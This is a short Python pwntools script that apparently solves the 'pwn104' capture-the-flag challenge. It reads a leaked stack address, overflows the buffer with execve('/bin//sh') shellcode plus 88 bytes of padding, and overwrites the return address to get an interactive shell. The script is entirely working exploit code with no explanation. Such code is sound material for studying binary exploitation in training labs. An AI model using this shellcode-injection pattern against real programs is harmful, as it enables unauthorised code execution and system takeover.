from pwn import *

p = process("./pwn104-1644300377109.pwn104")

leak = p.recvuntil(b"at")

address = p.recvline()
leaks = p64(int(address, 16))



padding = 88
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

shell_len = len(shellcode)

buffow = shellcode+b"A"*(padding - shell_len)+leaks

p.sendline(buffow)

p.interactive()
